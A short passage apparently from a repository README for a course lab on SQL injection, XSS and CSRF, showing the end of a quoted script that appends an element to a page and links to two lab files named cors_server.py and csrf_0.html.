>>         $("body").append(container);});
>> </script>
>> ```
>    
>

### [cors_server.py](https://github.com/plmcdowe/52600/blob/ed4b61dbb8067082c3c6ec5d86f9f5ef0145be79/2b-SQL-XSS-CSRF/cors_server.py)
### [csrf_0.html](https://github.com/plmcdowe/52600/blob/ed4b61dbb8067082c3c6ec5d86f9f5ef0145be79/2b-SQL-XSS-CSRF/csrf_0.html)
